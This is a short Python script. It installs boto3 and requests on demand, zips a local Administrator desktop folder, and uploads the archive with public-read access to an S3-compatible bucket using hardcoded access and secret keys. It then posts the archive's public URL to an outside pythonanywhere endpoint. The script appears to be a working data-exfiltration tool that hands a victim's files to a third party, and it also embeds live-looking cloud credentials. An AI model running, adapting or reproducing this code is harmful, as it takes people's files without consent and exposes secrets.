import subprocess
import sys

# ===== Step 0: Ensure required libraries are installed =====
required_packages = ["boto3", "requests", "botocore"]

for package in required_packages:
    try:
        __import__(package)
    except ImportError:
        print(f"Package '{package}' not found. Installing...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", package])

# ===== Step 1: Import libraries after ensuring installation =====
import boto3
from botocore.client import Config
from botocore.exceptions import ClientError
import zipfile
import os
import shutil
import requests
import json

# ===== Step 2: Config S3-compatible client =====
endpoint_url = "https://d2u6.or7.idrivee2-80.com"
access_key = "SUPwDwzLQ0K3thRSvETB"
secret_key = "ugekVFwTG6j9IkKg1w6DquotUm2Vw9KvR9iMqEk9"
bucket_name = "data"
local_dir = r"C:\Users\Administrator\Desktop\data"  # Folder to zip and upload
zip_file = "data.zip"

s3 = boto3.client(
    's3',
    aws_access_key_id=access_key,
    aws_secret_access_key=secret_key,
    endpoint_url=endpoint_url,
    config=Config(signature_version='s3v4')
)

# ===== Step 3: Create bucket if it doesn't exist =====
try:
    s3.head_bucket(Bucket=bucket_name)
    print(f"Bucket '{bucket_name}' already exists.")
except ClientError:
    print(f"Bucket '{bucket_name}' not found. Creating it...")
    s3.create_bucket(Bucket=bucket_name)
    print(f"Bucket '{bucket_name}' created successfully.")

# ===== Step 4: Zip the local folder =====
if os.path.exists(zip_file):
    os.remove(zip_file)

shutil.make_archive(zip_file.replace('.zip', ''), 'zip', local_dir)
print(f"Folder '{local_dir}' zipped to '{zip_file}'.")

# ===== Step 5: Upload ZIP to S3 bucket =====
s3.upload_file(zip_file, bucket_name, zip_file, ExtraArgs={'ACL': 'public-read'})
print(f"Uploaded '{zip_file}' to bucket '{bucket_name}' with public-read access.")

# ===== Step 6: Generate public URL =====
public_url = f"{endpoint_url}/{bucket_name}/{zip_file}"
print(f"Public URL: {public_url}")

# ===== Step 7: Send public URL to external server =====
server_endpoint = "https://azcaptchahh.pythonanywhere.com/url"
payload = {"url": public_url}
headers = {"Content-Type": "application/json"}

response = requests.post(server_endpoint, headers=headers, data=json.dumps(payload))
if response.ok:
    print(f"Successfully sent URL to server: {response.text}")
else:
    print(f"Failed to send URL. Status: {response.status_code}, Response: {response.text}")
